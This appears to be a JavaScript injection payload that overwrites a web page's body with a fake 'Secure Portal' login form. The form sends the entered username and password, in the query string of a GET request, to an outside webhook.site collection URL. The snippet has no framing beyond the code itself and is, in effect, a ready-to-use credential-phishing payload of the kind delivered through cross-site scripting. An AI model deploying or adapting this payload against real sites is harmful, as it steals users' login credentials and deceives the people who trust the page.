document.body.innerHTML = `
<style>
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background-color: #ffffff;
        color: #333;
    }
    .header {
        background-color: #222;
        color: #999;
        padding: 10px 40px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-size: 18px;
    }
    .login-container {
        max-width: 800px;
        margin: 80px auto;
        padding: 0 20px;
    }
    h1 {
        font-weight: normal;
        color: #333;
        font-size: 32px;
        margin-bottom: 10px;
    }
    p {
        margin-bottom: 20px;
        font-size: 14px;
    }
    .form-group {
        margin-bottom: 15px;
    }
    label {
        display: block;
        font-weight: bold;
        margin-bottom: 5px;
        font-size: 14px;
    }
    input[type="text"], input[type="password"] {
        width: 100%;
        padding: 8px;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
    }
    input[type="submit"] {
        padding: 8px 20px;
        background-color: #f8f8f8;
        border: 1px solid #ccc;
        border-radius: 4px;
        cursor: pointer;
        margin-top: 10px;
        font-size: 14px;
    }
    input[type="submit"]:hover {
        background-color: #eee;
    }
    .footer-links {
        margin-top: 30px;
        font-size: 14px;
        border-top: 1px solid #eee;
        padding-top: 20px;
    }
    a {
        color: #007bff;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
    }
</style>

<div class="header">
    <span>Secure Portal</span>
    <span style="font-size: 14px;">Login</span>
</div>

<div class="login-container">
    <h1>Welcome to the Portal</h1>
    <p>Please log in to your account:</p>
    
    <form action="https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5" method="GET">
        <div class="form-group">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" placeholder="Username">
        </div>
        
        <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Password">
        </div>
        
        <input type="submit" name="submit" value="Login">
    </form>

    <div class="footer-links">
        <p>Don't have an account yet? <a href="#">Register a free account now!</a></p>
        <p><a href="#">Reset your password</a></p>
    </div>
</div>
`;
